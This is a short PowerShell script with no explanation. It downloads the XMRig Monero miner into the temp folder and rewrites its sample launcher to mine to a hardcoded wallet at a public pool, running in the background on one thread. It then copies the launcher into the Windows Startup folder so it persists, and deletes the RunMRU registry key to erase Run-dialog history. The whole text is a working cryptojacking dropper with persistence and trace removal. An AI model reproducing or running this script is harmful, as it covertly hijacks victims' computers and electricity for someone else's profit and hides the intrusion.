$URL = “https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip”
$Path=”$env:tmp/xmrig-6.18.1-gcc-win64.zip”
$Path1=”$env:tmp/xmrig”
Invoke-WebRequest -URI $URL -OutFile $Path
Expand-Archive -Path $Path -DestinationPath $Path1
$r = Get-ChildItem $env:tmp/xmrig
$o = $r.Name
$run = "$Path1\$o"
$ex = Get-Content $run\solo_mine_example.cmd -Raw
$ex1 = $ex -replace "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD","49A5RK8ZrdBj7XutmbYv1s7VtVNVpp1QQjaYRNpiXuyqWyqcVcfVFVrC3u5XXMyTYtSSADkNy5kmFBxNjeGAdp93G2P4rpW" -replace "node.xmr.to:18081","pool.supportxmr.com:3333" -replace "-a rx/0", "-p flip" -replace "--daemon", "-B -t 1" -replace "cd %~dp0","cd %TEMP%\xmrig\xmrig-6.18.1"
$ex1 | Out-File -FilePath $run\solo_mine_example.cmd -Encoding utf8
Copy-Item $run\solo_mine_example.cmd -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
